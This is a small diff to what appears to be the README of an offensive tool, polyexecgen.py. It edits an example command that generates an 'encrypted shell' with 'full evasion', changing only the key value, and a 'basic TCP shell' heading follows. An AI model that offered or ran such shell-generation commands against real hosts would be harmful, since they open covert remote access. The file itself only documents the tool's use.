@@ -30,7 +30,7 @@ Traffic jitter<br>
 
 ##### Encrypted shell -- full evasion:
 
-    ./polyexecgen.py -t 192.168.1.5 -p 6969 -m encrypted -k mygoodpassword
+    ./polyexecgen.py -t 192.168.1.5 -p 6969 -m encrypted -k myg00dpassw0rd
     
 ##### basic TCP shell:
 
